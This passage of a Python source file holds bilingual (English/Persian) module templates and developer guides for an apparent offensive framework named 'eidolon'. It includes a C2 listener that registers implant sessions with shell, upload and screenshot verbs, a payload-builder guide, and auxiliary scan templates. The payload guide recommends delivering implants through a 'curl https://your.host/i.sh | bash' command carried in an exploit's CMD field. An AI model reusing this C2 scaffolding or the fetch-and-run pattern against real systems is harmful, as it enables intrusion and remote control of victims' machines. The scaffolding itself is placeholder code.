  * هرگز eval/exec؛ قالب‌بندی سیمی تو را دفاعی پارس کن (سقف سایز).

بخش ۶ — چک‌لیست پیش از اعلام «تمام»
  [ ] stop() همه‌ی سوکت/حلقه را می‌بندد — `kill <id>` واقعاً می‌کشد
  [ ] register() به ازای هر ایمپلنت یک بار، sid یکتا و پایدار
  [ ] sess.interact سیم‌کشی شده + _c2_on_event روی "up" ("down" هم در خروج)
  [ ] پروفایل قبل از هر run بیلدر منتشر شده
  [ ] تب‌کامپلیت داخل `use <sid>` مجموعه‌ی واقعی فعل‌هاست
"""

import asyncio

from eidolon.utils import ok, info

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: یک خط تیز — این لیسنر چه چیزی را سرو می‌کند"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "listener"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module


OPTIONS = {
    "host": {"value": "0.0.0.0", "required": False, "desc": "آدرسِ bind"},
    "port": {"value": 0,         "required": True,  "desc": "0 = خودکار یک پورت آزاد"},
}

SERVER = None               # توسط run() تنظیم می‌شود؛ stop() می‌بنددش
TAGS = ("__NAME__",)        # برچسب‌های آزاد — معنایشان فقط توافقی است که شما می‌کنید


class _Profile:
    """برای بیلدرهای پیلود منتشر می‌شود — هر شی با .url/.token/.tags کار می‌کند."""

    def __init__(self, url, token, tags):
        self.url, self.token, self.tags = url, token, tags


def _complete(text, line):
    # حرکت ۴ — تب‌کامپلیت کامل داخل `use <sid>`: کلماتِ تو، قوانینِ تو
    return [w for w in ("shell", "upload", "download", "screenshot", "ping", "die")
            if w.startswith(text)]


def _enter(sh, sess, send):
    # حرکت ۴ — `use <sid>` اینجا فرود می‌آید: پرامپتِ تو، دستورهای تو، کامپلیشنِ تو
    sh.enter_subshell(on_line=send,
                      completer=_complete,
                      prompt_fn=lambda: "%.4s ❯ " % sess.sid,
                      on_exit=lambda: info("left the session shell"))


async def run(opts):
    global SERVER
    from eidolon.wraith.sessions import default_registry

    async def handle(reader, writer):
        peer = str(writer.get_extra_info("peername", "?"))
        loop = asyncio.get_running_loop()

        # حرکت ۳ — یک اتصال: قالب‌بندیِ خودِ تو مشخص می‌کند register() چه می‌گیرد،
        # مثلاً hello = json.loads((await asyncio.wait_for(reader.readline(), 10)).decode())
        reg = default_registry()
        sess = reg.register({"sid": peer.split(":")[-1],          # TODO: شناسه‌ی واقعی ایمپلنت
                             "implant": "unknown",
                             "os": "unknown", "arch": "unknown",
                             "user": "unknown", "host": "unknown",
                             "tags": TAGS}, addr=peer)

        async def send(line):
            writer.write((line + "\n").encode())
            try:
                await writer.drain()
            except Exception:
                pass

        sess.interact = lambda sh: _enter(
            sh, sess, lambda line: loop.call_soon_threadsafe(loop.create_task, send(line)))
        EIDOLON_SHELL._c2_on_event(("up", sess))          # اعلانِ فوریِ کنسول

    server = await asyncio.start_server(handle, opts.get("host", "0.0.0.0"),
                                        int(opts.get("port", 0) or 0))
    SERVER = server

    # حرکت ۲ — انتشار پروفایل تا بیلدرهای پیلود بخوانندش
    EIDOLON_SHELL.wraith_listener = _Profile(
        "tcp://%s:%d" % server.sockets[0].getsockname()[:2], "", TAGS)

    # حرکت ۱ — سرو. برای همیشه بلاک شدن اینجا درست است: run() ماژول لیسنر
    # خودکار به job مدیریت‌شده می‌رود؛ `kill <id>` صدا می‌زند stop().
    ok("__NAME__ سرور روشن شد روی %s (async — بومی)" % str(server.sockets[0].getsockname()))
    info("ساخت ایمپلنت: gen <ماژول پیلود> · set · run")
    async with server:
        await server.serve_forever()


def stop():
    if SERVER is not None:
        try:
            SERVER.close()
        except Exception:
            pass
''',
    },
    "payload": {
        "en": r'''"""
__NAME__ — PAYLOAD BUILDER — the complete zero-to-100 developer guide
======================================================================

WHAT A BUILDER IS HERE
  The framework ships ZERO payload sources and ZERO compilers: THIS module
  is the builder. Produce the implant in ANY language (go / nim / c / rust /
  c# / bash / python / PowerShell ...) — the entry script is Python, the
  output is yours. Layout is free (_src/, assets/, ... — resolve from
  __eidolon_path__).

PART 1 — THE CONTRACT (same two names as every module)
  * OPTIONS  : build-time parameters. The operator sets them with `set`
               inside `gen <module>` (GEN MODE) — this one page IS the
               payload's configuration; everything typed here travels in
               the manifest's "config" field.
  * run(opts): build the artifact and register it. Plain def; builders
               normally return fast (put the wildly slow compiles in a
               thread of your own).
  * stop()   : rarely needed — builders usually return.

PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
  opts              {KEY: value} — resolved option values
  EIDOLON_GLOBALS   shared global dict — persist small state
  EIDOLON_SHELL     the live console instance
  __eidolon_path__  absolute path of this file (siblings/_src/ from it)

PART 3 — WRITING A BUILDER FROM ZERO (the exact recipe)
  1. Read the listener profile and REFUSE to build without one — a payload
     that cannot phone home is garbage:
         lsn = EIDOLON_SHELL.wraith_listener
         if not lsn: return err("no listener up — use <listener> · set · run")
     Embed what you agree on: lsn.url (dial point), lsn.token (shared
     secret), lsn.tags. Substitution is your choice: string replace, code
     emission, binpatch — whatever your pipeline likes.
  2. Read raw sources next to this file via __eidolon_path__ (e.g.
     _src/implant.go — declare it in ASSETS so install_local ships it),
     compile via subprocess — ALWAYS with a timeout:
         subprocess.run([...], timeout=120, capture_output=True)
     Non-zero exit / timeout -> err(stderr tail) and stop.
  3. STORE WHERE THE OPERATOR STANDS — never in temp storage:
         out = str(opts.get("output", "")).strip()
         if not out:
             out = os.path.join(os.getcwd(), name + ".ext")   # operator's cwd
         out = os.path.abspath(os.path.expanduser(out))
         if os.path.isdir(out): out = os.path.join(out, name + ".ext")
     The operator runs eidolon inside /my-file/my-payload/ and the build
     lands at /my-file/my-payload/implant.exe — or exactly ./ for a
     relative path. The framework REFUSES payloads under /tmp, /var/tmp,
     /dev/shm and %TEMP% (both in register_payload and in
     `set payload <path>`); throwaway copies must never be depended upon.
     Artifacts holding real key material: write 0o600/0o700.
  4. REGISTER so exploits can find it:
         from eidolon.wraith import store
         manifest = store.register_payload(
             name, out,
             ptype="file-posix",           # file-posix | file-win | shellcode | cmd | code
             backend="sh",                 # free label — who/what executes it
             target_os=..., arch=...,      # free metadata
             config={k: v for k, v in opts.items() if k != "store_name"},
             protocol_tag="",              # OPTIONAL free metadata — display only
             note="built by __NAME__",
             keep=True)                    # artifact STAYS at the operator path
     keep=True is the rule here: the manifest records the ABSOLUTE path
     where YOU wrote it; the store never copies/moves. store.summary
     prints a one-liner; store.artifact_path(manifest) is the path
     exploits read via manifest["path"].
  5. Match ptype to reality: file-posix for ELF/linux scripts, file-win
     for PE, shellcode for raw code (size/arch/badchars are now YOUR
     problem), cmd for one-liners, code for interpreter sources. Exploits
     restrict their "types" tuple; a mismatched payload is REFUSED at
     `set payload`, never silently mixed.

PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
      new_module mybldr payload ; trust mybldr
      (listener up: use mylsn ; set port ; run)
      gen mybldr                        -> builder selected (GEN MODE)
      set store_name acme-implant       -> store name
      set output                        optional: exact artifact path
      run                               -> build + register; prints:
        stored: acme-implant [file-posix] -> store path
        artifact kept at: /my-file/my-payload/acme-implant.sh
      c2 payloads                       -> the typed store listing
      use myexp ; set payload acme-implant ; run
  Advisory classic pattern (curl|bash): host the built file anywhere (the
  listener does not need to exist yet) and let the exploit's CMD field
  carry it, e.g.: curl https://your.host/i.sh | bash

PART 5 — CHECKLIST BEFORE YOU CALL IT DONE
  [ ] builds refuse (err) when wraith_listener is missing
  [ ] every subprocess has a timeout; tool failures report stderr
  [ ] artifact lands in the operator's cwd or the explicit `output`
  [ ] chmod 0o600/0o700 on artifacts; config snapshot in the manifest
  [ ] ptype matches the actual artifact
"""

import os

from eidolon.utils import ok, info

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: builds <what> for <which targets>"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "payload"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module


OPTIONS = {
    "store_name":  {"value": "",      "required": False, "desc": "store name (default: this module's NAME)"},
    "target_os":   {"value": "linux", "required": False, "desc": "target OS"},
    "target_arch": {"value": "x86_64","required": False, "desc": "target arch"},
    "output":      {"value": "",      "required": False,
                    "desc":  "artifact path (default: <your current directory>/<store_name>.sh)"},
}


def run(opts):
    # PLACEHOLDER BUILD — replace with your REAL sources (e.g. _src/ next to
    # this file) and your compiler invocation. This one just proves the
    # builder → store → exploit pipeline end to end.
    name = (str(opts.get("store_name", "")) or NAME).strip()
    out  = str(opts.get("output", "")).strip()
    if not out:
        out = os.path.join(os.getcwd(), name + ".sh")   # operator's cwd — NEVER /tmp
    out = os.path.abspath(os.path.expanduser(out))
    if os.path.isdir(out):
        out = os.path.join(out, name + ".sh")

    with open(out, "w", encoding="utf-8") as f:
        f.write("#!/bin/sh\n"
                "# TODO: real build for %s/%s\n"
                "echo 'implant placeholder — built by %s'\n"
                % (opts.get("target_os", "?"), opts.get("target_arch", "?"), NAME))
    os.chmod(out, 0o700)

    # REGISTER — typed + hashed; `config` carries the operator's `set` values
    # so exploits that care can read them straight from the manifest.
    from eidolon.wraith import store
    manifest = store.register_payload(
        name, out, ptype="file-posix",
        backend="placeholder",
        target_os=str(opts.get("target_os", "")),
        arch=str(opts.get("target_arch", "")),
        config={k: v for k, v in opts.items() if k != "store_name"},
        protocol_tag="",          # OPTIONAL free metadata — display only
        keep=True,                # artifact STAYS at the operator path — nothing staged
    )
    ok("stored: %s" % store.summary(manifest))
    info("artifact kept at: %s" % store.artifact_path(manifest))
    info("exploits adopt it by: set payload %s  (or any raw file path)" % name)
''',
        "fa": r'''"""
__NAME__ — بیلدر پیلود (PAYLOAD BUILDER) — راهنمای کامل صفر تا صد
======================================================================

بیلدر در اینجا یعنی چه
  فریم‌ورک «هیچ» سورس پیلود و «هیچ» کامپایلری با خودش حمل نمی‌کند: این
  ماژول همان بیلدر است. ایمپلنت را به «هر زبانی» بساز (go / nim / c / rust /
  c# / bash / python / PowerShell …) — اسکریپت ورودی پایتون است، خروجی مالِ
  توست. چیدمان آزاد (_src/، assets/ … — از __eidolon_path__ حل کن).
  هر چه install_local باید همراه ماژول بنشاند را در ASSETS اعلام کن.

بخش ۱ — قرارداد (همان دو نامِ هر ماژول)
  * OPTIONS  : پارامترهای زمانِ ساخت. اپراتور با `set` درون `gen <ماژول>`
               (حالت GEN) تنظیمشان می‌کند — همین یک صفحه خودش پیکربندیِ
               پیلود است؛ هر چه اینجا تایپ شود به فیلد "config" مانیفست
               می‌رود.
  * run(opts): آرتیفکت را بساز و ثبت کن. def ساده؛ بیلدرها معمولاً سریع
               برمی‌گردند (کامپایل‌های خیلی سنگین را در thread خودت بگذار).
  * stop()   : به‌ندرت لازم است — بیلدرها برمی‌گردند.

بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
  opts              {کلید: مقدار} — مقادیر حل‌شده
  EIDOLON_GLOBALS   دیکشنری سراسری مشترک
  EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول
  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها/_src/ از روی آن)

بخش ۳ — نوشتن بیلدر از صفر، گام به گام
  ۱. پروفایل لیستنر را بخوان و «بدون آن قطعاً رد شو» — پیلودی که نمی‌تواند
     زنگ بزند آشغال است:
         lsn = EIDOLON_SHELL.wraith_listener
         if not lsn: return err("لیستنری بالا نیست — use <لیستنر> · set · run")
     آنچه توافق می‌کنی را جاسازی کن: lsn.url (نقطه‌ی شماره‌گیری)،
     lsn.token (راز مشترک)، lsn.tags. شیوه‌ی جایگزینی دست خودت است:
     جایگزینی رشته، تولید کد، باینری‌پیچ — هر چه پایپ‌لاینِ تو می‌خواهد.
  ۲. سورس‌های خام را کنار همین فایل بخوان (مثلاً _src/implant.go — در ASSETS
     اعلامشان کن تا install_local همراهشان بیاورد) و با
     subprocess کامپایل کن — همیشه با timeout:
         subprocess.run([...], timeout=120, capture_output=True)
     خروج غیرصفر یا timeout <- err(دُم stderr) و بس.
  ۳. دقیقاً همان‌جا که اپراتور ایستاده ذخیره کن — هرگز انبار موقت نه:
         out = str(opts.get("output", "")).strip()
         if not out:
             out = os.path.join(os.getcwd(), name + ".exe")   # پوشه‌ی کاری اپراتور
         out = os.path.abspath(os.path.expanduser(out))
         if os.path.isdir(out): out = os.path.join(out, name + ".exe")
     اپراتور داخل /my-file/my-payload/ برود eidolon را باز کند، ایمپلنت در
     /my-file/my-payload/implant.exe ساخته می‌شود — و برای مسیر نسبی
     دقیقاً در ./ . فریم‌ورک پیلودهای زیر /tmp و /var/tmp و /dev/shm و
     %TEMP% را رد می‌کند (هم در register_payload هم در
     `set payload <مسیر>`)؛ به کپی‌های دور‌ریز هرگز نباید تکیه شود.
     آرتیفکت حاوی ماده‌ی راز: با 0o600/0o700 نوشته شود.
  ۴. ثبت کن تا اکسپلویت‌ها پیدایش کنند:
         from eidolon.wraith import store
         manifest = store.register_payload(
             name, out,
             ptype="file-posix",           # file-posix | file-win | shellcode | cmd | code
             backend="sh",                 # برچسب آزاد — چه کسی/چه چیزی اجرایش می‌کند
             target_os=..., arch=...,      # متادیتای آزاد
             config={k: v for k, v in opts.items() if k != "store_name"},
             protocol_tag="",              # متادیتای آزاد اختیاری — فقط نمایش
             note="built by __NAME__",
             keep=True)                    # آرتیفکت دقیقاً در مسیر اپراتور می‌ماند
     keep=True قانونِ اینجاست: مانیفست مسیرِ مطلقی را ثبت می‌کند که «تو»
     نوشتی؛ انبار هرگز کپی/جابجایی نمی‌کند. store.summary یک خط خلاصه
     می‌دهد؛ store.artifact_path(manifest) همان مسیری است که اکسپلویت‌ها
     از manifest["path"] می‌خوانند.
  ۵. ptype را با واقعیت هم‌تراز کن: file-posix برای ELF/اسکریپت‌های لینوکس،
     file-win برای PE، shellcode برای کد خام (سایز/معماری/بدکاراکترها حالا
     مشکل «تو»ست)، cmd برای خط‌فرمان‌ها، code برای سورس‌های مفسرِدار.
     اکسپلویت‌ها تاپل "types" خودشان را محدود می‌کنند؛ پیلود ناهم‌تایپ در
     `set payload` رد می‌شود و هرگز بی‌سروصدا میکس نمی‌شود.

بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
      new_module mybldr payload ؛ trust mybldr
      (لیستنر روشن: use mylsn ؛ set port ؛ run)
      gen mybldr                        <- بیلدر انتخاب شد (حالت GEN)
      set store_name acme-implant       <- نام انبار
      set output                        اختیاری: مسیر دقیق آرتیفکت
      run                               <- ساخت + ثبت؛ چاپ می‌شود:
        stored: acme-implant [file-posix] -> مسیر انبار
        artifact kept at: /my-file/my-payload/acme-implant.sh
      c2 payloads                       <- فهرست انبار تایپ‌دار
      use myexp ؛ set payload acme-implant ؛ run
  الگوی کلاسیک مشورتی curl|bash: فایل ساخته‌شده را هر جا آپلود کن (لیستنر
  لازم نیست هنوز وجود داشته باشد) و بگذار فیلد CMD اکسپلویت حامل باشد،
  مثلاً: curl https://your.host/i.sh | bash

بخش ۵ — چک‌لیست پیش از اعلام «تمام»
  [ ] بدون wraith_listener با err رد می‌شود
  [ ] هر subprocess timeout دارد؛ شکست ابزار stderr را گزارش می‌کند
  [ ] آرتیفکت در پوشه‌ی کاری اپراتور یا output صریح می‌نشیند
  [ ] chmod 0o600/0o700 روی آرتیفکت؛ snapshot پیکربندی در مانیفست
  [ ] ptype با آرتیفکت واقعی هم‌خوان است
"""

import os

from eidolon.utils import ok, info

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: چه چیزی برای چه هدف‌هایی می‌سازد"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "payload"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module


OPTIONS = {
    "store_name":  {"value": "",      "required": False, "desc": "نام در انبار (پیش‌فرض: NAME همین ماژول)"},
    "target_os":   {"value": "linux", "required": False, "desc": "سیستم‌عامل هدف"},
    "target_arch": {"value": "x86_64","required": False, "desc": "معماری هدف"},
    "output":      {"value": "",      "required": False,
                    "desc":  "مسیر آرتیفکت (پیش‌فرض: <پوشهِ کاری تو>/<store_name>.sh)"},
}


def run(opts):
    # ساختِ جانگهدار — با سورس‌های واقعی خودت (مثلاً _src/ کنار همین فایل) و
    # فراخوانیِ کامپایلرِ خودت جایگزین کن. این فقط لوله‌بیلدر→انبار→اکسپلویت را
    # سر تا ته ثابت می‌کند.
    name = (str(opts.get("store_name", "")) or NAME).strip()
    out  = str(opts.get("output", "")).strip()
    if not out:
        out = os.path.join(os.getcwd(), name + ".sh")   # operator's cwd — NEVER /tmp
    out = os.path.abspath(os.path.expanduser(out))
    if os.path.isdir(out):
        out = os.path.join(out, name + ".sh")

    with open(out, "w", encoding="utf-8") as f:
        f.write("#!/bin/sh\n"
                "# TODO: build واقعی برای %s/%s\n"
                "echo 'implant placeholder — ساخته‌شده توسط %s'\n"
                % (opts.get("target_os", "?"), opts.get("target_arch", "?"), NAME))
    os.chmod(out, 0o700)

    # ثبت — تایپ‌دار + هش‌دار؛ `config` مقدارهای set اپراتور را با خود حمل
    # می‌کند تا اکسپلویت‌هایی که می‌خواهند مستقیم از مانیفست بخوانند.
    from eidolon.wraith import store
    manifest = store.register_payload(
        name, out, ptype="file-posix",
        backend="placeholder",
        target_os=str(opts.get("target_os", "")),
        arch=str(opts.get("target_arch", "")),
        config={k: v for k, v in opts.items() if k != "store_name"},
        protocol_tag="",          # متادیتای اختیاری آزاد — فقط نمایش
        keep=True,                # آرتیفکت دقیلاً در مسیرِ اپراتور می‌ماند — هیچ مرحله‌بندی
    )
    ok("ثبت شد: %s" % store.summary(manifest))
    info("آرتیفکت همانجا ماند: %s" % store.artifact_path(manifest))
    info("اکسپلویت برمی‌داردش با: set payload %s  (یا هر مسیر خام فایل)" % name)
''',
    },
    "auxiliary": {
        "en": r'''"""
__NAME__ — AUXILIARY module — the complete zero-to-100 developer guide
=======================================================================

WHAT AN AUXILIARY IS HERE
  AUXILIARY = investigation and support. Attacks nothing directly. The
  whole spectrum is open: port scans, service fingerprints, OSINT, DNS
  recon, fuzz harnesses, sniffers, brute-force helpers, parsers, report
  writers — anything that makes the exploit layer smarter.

PART 1 — THE CONTRACT (the framework requires exactly two names)
  * OPTIONS  : {KEY: {"value": default, "required": bool, "desc": str}}
               `set KEY value` fills them; required keys validated
               automatically BEFORE run() fires.
  * run(opts): receives {KEY: value}; plain def or async def.
  Optional hooks: on_load() / stop() — like every module.

PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
  opts              {KEY: value} — resolved option values
  EIDOLON_GLOBALS   shared global dict — persist small state
  EIDOLON_SHELL     the live console instance (internal API — sparingly)
  __eidolon_path__  absolute path of this file (resolve siblings from it)

PART 3 — WRITING AN AUXILIARY FROM ZERO (the exact recipe)
  1. Decide PASSIVE vs ACTIVE and LET THE OPERATOR CHOOSE: a default-off
     `active` flag is the house pattern (the scaffold ships one). Passive
     by default keeps the module safe to run against anything, anytime.
  2. Declare OPTIONS minimally: target (required), active, output — plus
     whatever the technique needs (ports, wordlist, depth, threads).
  3. Implement run(opts):
       - collect findings into a list (plain values — strings/small dicts);
       - every packet/request gets an explicit timeout; concurrency is
         bounded (ThreadPoolExecutor(max_workers=16) or a semaphore);
       - active probes label themselves in the output (what was sent);
       - errors: try/except -> err(str(e)) — skip and continue the sweep.
  4. Results: if `output` is set, write the report there (relative path =
     operator's cwd — nothing goes to temp storage); else print rows on
     the console. Machine-readable output (json/csv) beats pretty guessing.
  5. (optional) Advisory identity: RANK / TARGETS / REFERENCES — displayed
     by `info`, never enforced.

PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
      new_module myaux auxiliary ; trust myaux ; use myaux
      set target 10.4.2.0/24 ; run        -> passive inspection
      set active true ; run               -> touching probes on
      set output recon-vpn.json ; run     -> report lands beside the operator
  Auxiliaries are plain runs: they job out only if `run` blocks (`jobs` /
  `kill <id>`), exactly like every other module type.

PART 5 — CHECKLIST BEFORE YOU CALL IT DONE
  [ ] passive by default, active opt-in
  [ ] every probe has an explicit timeout and bounded concurrency
  [ ] findings are plain values; report path = operator's cwd (never temp)
  [ ] errors skip a host, they never kill the sweep
  [ ] output format is documented in the OPTIONS desc lines
"""

from eidolon.utils import ok, err, info, warn, spectral

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: one sharp line — what this auxiliary module does"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "auxiliary"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module

PAYLOAD_KIND = "none"

OPTIONS = {
    "target": {"value": "", "required": True,
               "desc":  "host / file / keyword this inspection runs on"},
    "active": {"value": False, "required": False,
               "desc":  "touch the target (packets/requests) — off = passive"},
    "output": {"value": "", "required": False,
               "desc":  "write the findings here (empty = console only)"},
}


def run(opts):
    target = str(opts.get("target", "")).strip()
    if not target:
        return err("set it: set target <value>")

    info(f"__NAME__: inspecting {target!r}")
    findings = []

    # -- the inspection: scans / OSINT / fuzz / parse / brute / etc ----------
    try:
        pass        # your capability here
    except Exception as e:
        return err(f"failed: {e}")

    out = str(opts.get("output", "")).strip()
    if out:
        with open(out, "w", encoding="utf-8") as f:
            f.write("\n".join(map(str, findings)))
        ok(f"{len(findings)} finding(s) → {out}")
    else:
        for row in findings:
            print("   ", row)
    ok("__NAME__ finished (scaffold — passive by default)")
''',
        "fa": r'''"""
__NAME__ — ماژول AUXILIARY — راهنمای کامل صفر تا صد توسعه‌دهنده
=======================================================================

auxiliary در اینجا یعنی چه
  AUXILIARY = پژوهش و پشتیبانی. مستقیماً به هیچ چیزی حمله نمی‌کند. کل طیف
  باز است: اسکن پورت، انگشت‌نگاری سرویس، ‏OSINT، ‏recon دامنه، هارنسِ fuzz،
  اسنیفر، مددِ brute-force، پارسر، گزارش‌نویس — هر چیزی که لایه‌ی
  اکسپلویت را باهوش‌تر کند.

بخش ۱ — قرارداد (فریم‌ورک فقط دو نام لازم دارد)
  * OPTIONS  : {کلیدی: {"value": پیشفرض, "required": بول, "desc": توضیح}}
               با `set کلید مقدار` پر می‌شوند؛ کلیدهای required قبل از
               اجرای run() خودکار کنترل می‌شوند.
  * run(opts): {کلیدی: مقدار} می‌گیرد؛ def ساده یا async def.
  قلاب‌های اختیاری: on_load() / stop() — مثل همه‌ی ماژول‌ها.

بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
  opts              {کلید: مقدار} — مقادیر حل‌شده‌ی گزینه‌ها
  EIDOLON_GLOBALS   دیکشنری سراسری مشترک — نگهداری حالت کوچک
  EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول (API داخلی — کم و حساب‌شده)
  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از روی آن حل کن)

بخش ۳ — نوشتن auxiliary از صفر، گام به گام
  ۱. تصمیم بگیر «منفعل» یا «فعال» و انتخاب را به اپراتور بده: الگوی خانه
     فلگ `active` است که پیش‌فرض خاموش است (این اسکلت هم آن را دارد).
     پیش‌فرضِ منفعل ماژول را امن می‌کند که هر لحظه روی هر چیزی اجرا شود.
  ۲. OPTIONS حداقلی: target (لازم)، active، output — به‌علاوه‌ی هر چه
     تکنیکت لازم دارد (پورت‌ها، ووردلیست، عمق، تعداد ریسمان).
  ۳. پیاده‌سازی run(opts):
       - یافته‌ها را در یک لیست جمع کن (مقدار ساده — رشته/دیک کوچک)؛
       - هر بسته/درخواست timeout صریح دارد؛ هم‌زمانی محدود است
         (ThreadPoolExecutor(max_workers=16) یا سیمافور)؛
       - پراب‌های فعال خودشان را در خروجی معرفی می‌کنند (چه فرستاده شد)؛
       - خطا: try/except <- err(str(e)) — یک میزبان را رد کن، جارو ادامه.
  ۴. خروجی: اگر `output` ست شود گزارش همان‌جا نوشته می‌شود (مسیر نسبی =
     پوشه‌ی کاری اپراتور — هیچ چیز به انبار موقت نمی‌رود)؛ وگرنه سطرها
     روی کنسول چاپ می‌شوند. خروجی ماشینی (json/csv) از حدسِ قشنگ بهتر است.
  ۵. (اختیاری) هویت مشورتی: RANK / TARGETS / REFERENCES — با `info` نمایش،
     هرگز اجرایی نیستند.

بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
      new_module myaux auxiliary ؛ trust myaux ؛ use myaux
      set target 10.4.2.0/24 ؛ run        <- بازرسی منفعل
      set active true ؛ run               <- پراب‌های فعال روشن
      set output recon-vpn.json ؛ run     <- گزارش کنار اپراتور می‌نشیند
  auxiliary اعمالِ ساده است: فقط وقتی `run` بلوک کند job می‌شود (`jobs` /
  `kill <id>`)، درست مثل بقیه‌ی تایپ‌ها.

بخش ۵ — چک‌لیست پیش از اعلام «تمام»
  [ ] پیش‌فرض منفعل، فعال‌شدن با رضایت صریح
  [ ] هر پراب timeout صریح و هم‌زمانی محدود دارد
  [ ] یافته‌ها مقدار ساده‌اند؛ مسیر گزارش = پوشه‌ی کاری اپراتور (هرگز tmp)
  [ ] خطا یک میزبان را می‌پراند، جارو را نمی‌کشد
  [ ] قالب خروجی در توضیح OPTIONS مستند است
"""

from eidolon.utils import ok, err, info, warn, spectral

NAME        = "__NAME__"
VERSION     = "0.1.0"
DESCRIPTION = "TODO: one sharp line — what this auxiliary module does"
CATEGORY    = "__CATEGORY__"
MODULE_TYPE = "auxiliary"
AUTHOR      = "__AUTHOR__"

RANK        = "normal"      # quality grade: excellent > great > good > normal > average > low > manual
TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
ASSETS      = []            # bundled files/dirs (relative to this file) install_local ships with the module

PAYLOAD_KIND = "none"

OPTIONS = {
    "target": {"value": "", "required": True,
               "desc":  "host / file / keyword this inspection runs on"},
    "active": {"value": False, "required": False,
               "desc":  "touch the target (packets/requests) — off = passive"},
    "output": {"value": "", "required": False,
               "desc":  "write the findings here (empty = console only)"},
}


def run(opts):
    target = str(opts.get("target", "")).strip()
    if not target:
        return err("set it: set target <value>")

    info(f"__NAME__: inspecting {target!r}")
    findings = []

    # -- the inspection: scans / OSINT / fuzz / parse / brute / etc ----------
    try:
        pass        # your capability here
    except Exception as e:
        return err(f"failed: {e}")

    out = str(opts.get("output", "")).strip()
    if out:
        with open(out, "w", encoding="utf-8") as f:
            f.write("\n".join(map(str, findings)))
        ok(f"{len(findings)} finding(s) → {out}")
    else:
        for row in findings:
            print("   ", row)
    ok("__NAME__ finished (scaffold — passive by default)")
''',
    },
    "generic": {
        "en": r'''"""
__NAME__ — GENERIC module — the complete zero-to-100 developer guide
=====================================================================

WHAT A GENERIC MODULE IS HERE
  GENERIC = neither attack nor investigation: encoders/decoders,
  converters, packagers, report generators, payload transformers (any
  language in -> anything out), automation glue. When it is not exploit,
  listener, payload or auxiliary — it lives here.

PART 1 — THE CONTRACT (the framework requires exactly two names)
  * OPTIONS  : {KEY: {"value": default, "required": bool, "desc": str}}
               `set KEY value` fills them; required keys validated
               automatically BEFORE run() fires.
  * run(opts): receives {KEY: value}; plain def or async def.
  Optional hooks: on_load() / stop() — like every module.

PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
  opts              {KEY: value} — resolved option values
  EIDOLON_GLOBALS   shared global dict — persist small state
  EIDOLON_SHELL     the live console instance (internal API — sparingly)
  __eidolon_path__  absolute path of this file (resolve siblings from it)

PART 3 — WRITING A GENERIC MODULE FROM ZERO (the exact recipe)
  1. One sharp responsibility per module: convert X to Y, package Z,
     generate report R. Composability beats cleverness — modules call
     each other by reading shared state through EIDOLON_GLOBALS.
  2. Declare OPTIONS: `input` (required — file, string, whatever your
     transform eats) and `output` (empty = print to console). Add knobs
     (mode, level, target language ...) as the tool needs.
  3. Implement run(opts):
       - read the input ONLY through the way the operator chose (path /
         string) — never invent locations, never touch temp storage;
       - output-path default is the operator's cwd (os.getcwd()) when you
         write artifacts; relative paths stay relative to that;
       - subprocess tools (compilers/encoders) always with a timeout and
         captured stderr; failures -> err(str(e)).
  4. Keep outputs inspectable: print a one-line summary via ok()/info();
     write the full result to `output` when set. Machine formats over
     prose.
  5. (optional) Advisory identity: RANK / TARGETS / REFERENCES.

PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
      new_module myconv generic ; trust myconv ; use myconv
      set input dump.bin ; run            -> console result
      set output converted.txt ; run      -> result beside the operator
  As everywhere: transformation tooling runs in the foreground; wrap your
  own long loops in a thread and let `run` job out if needed
  (`jobs` / `kill <id>`).

PART 5 — CHECKLIST BEFORE YOU CALL IT DONE
  [ ] single sharp responsibility; composable via EIDOLON_GLOBALS
  [ ] input only from OPTIONS-given paths; no temp staging
